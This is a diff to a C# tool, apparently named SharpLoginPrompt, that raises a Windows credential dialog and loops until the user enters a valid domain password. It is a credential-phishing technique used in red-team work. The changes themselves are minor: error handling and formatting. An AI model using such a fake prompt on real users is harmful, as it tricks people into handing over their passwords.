@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Net;
 using System.DirectoryServices.AccountManagement;
 using System.Runtime.InteropServices;
@@ -45,12 +45,13 @@ namespace SharpLoginPrompt
 
         static void Main(string[] args)
         {
+            try {  
             bool passwordOk = false;
             while (passwordOk != true)
             {
 
                 CREDUI_INFO credui = new CREDUI_INFO();
-                credui.pszCaptionText = args.Length ==2 ? args[0]:"Please enter the credentials";
+                credui.pszCaptionText = args.Length == 2 ? args[0] : "Please enter the credentials";
                 credui.pszMessageText = args.Length == 2 ? args[1] : "Domain: " + (Environment.GetEnvironmentVariable("USERDOMAIN").ToString() ?? Environment.GetEnvironmentVariable("HOSTNAME").ToString());
                 credui.cbSize = Marshal.SizeOf(credui);
                 IntPtr outCredBuffer = new IntPtr();
@@ -118,6 +119,11 @@ namespace SharpLoginPrompt
 
                     }
                 }
+            }
+        }
+            catch (Exception)
+            {
+                Console.WriteLine("Something Went Wrong");
             }
         }
     }
